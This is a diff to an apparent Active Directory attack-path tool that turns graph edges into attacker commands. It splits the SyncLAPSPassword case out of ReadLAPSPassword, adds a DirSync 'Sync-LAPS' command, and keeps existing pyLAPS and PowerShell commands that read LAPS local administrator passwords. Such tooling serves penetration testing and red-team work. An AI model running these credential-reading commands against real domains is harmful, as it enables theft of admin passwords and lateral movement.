@@ -5,6 +5,7 @@ identity the attacker operates as AFTER exploiting this edge.
 """
 
 from __future__ import annotations
+
 from dataclasses import dataclass, field
 
 
@@ -380,7 +381,7 @@ def get_commands(
                 ],
             ), na
 
-        case "ReadLAPSPassword" | "SyncLAPSPassword":
+        case "ReadLAPSPassword":
             return CommandSet(
                 f"Read the LAPS local admin password for {TF}.",
                 [
@@ -388,6 +389,17 @@ def get_commands(
                     f"pyLAPS --action get -c '{T}' -d {D} -u '{A}' -p '{PASS}' --dc-ip {DC}",
                     "# PowerShell:",
                     f"Get-ADComputer -Identity '{T}' -Properties 'ms-Mcs-AdmPwd' | Select -Expand 'ms-Mcs-AdmPwd'",
+                ],
+            ), na
+
+        case "SyncLAPSPassword":
+            target_sam = f"{T}$" if dst_kind == "computers" else T
+            return CommandSet(
+                f"Synchronize the LAPS password for {TF} through DirSync.",
+                [
+                    "# Import the DirSync PowerShell module, then authenticate as the source principal:",
+                    f"Sync-LAPS -LDAPFilter \"(samaccountname={target_sam})\" -Server <DC_FQDN>",
+                    "# SyncLAPSPassword is a DirSync primitive; it is distinct from direct ReadLAPSPassword access.",
                 ],
             ), na
 
